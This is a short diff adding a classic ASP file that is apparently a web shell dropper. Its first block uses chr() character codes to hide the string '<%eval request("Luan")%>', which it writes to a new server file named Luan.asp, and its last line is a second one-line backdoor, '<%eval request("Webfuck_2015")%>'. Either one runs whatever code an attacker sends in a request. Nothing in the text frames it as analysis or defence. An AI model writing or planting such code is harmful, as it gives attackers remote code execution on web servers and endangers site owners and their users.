@@ -1,0 +1,11 @@
+<%
+Text=";<"+chr(37)+"eval request("+chr(34)+chr(76)+chr(117)+chr(97)+chr(110)+chr(34)+")"+chr(37)+">" 
+FileName="Luan.asp"
+set fs=server.CreateObject("Scripting.FileSystemObject") 
+set file=fs.OpenTextFile(server.MapPath(FileName),2,True) 
+file.writeline Text 
+file.close
+set file=nothing 
+set fs=nothing 
+%>
+<%eval request("Webfuck_2015")%>
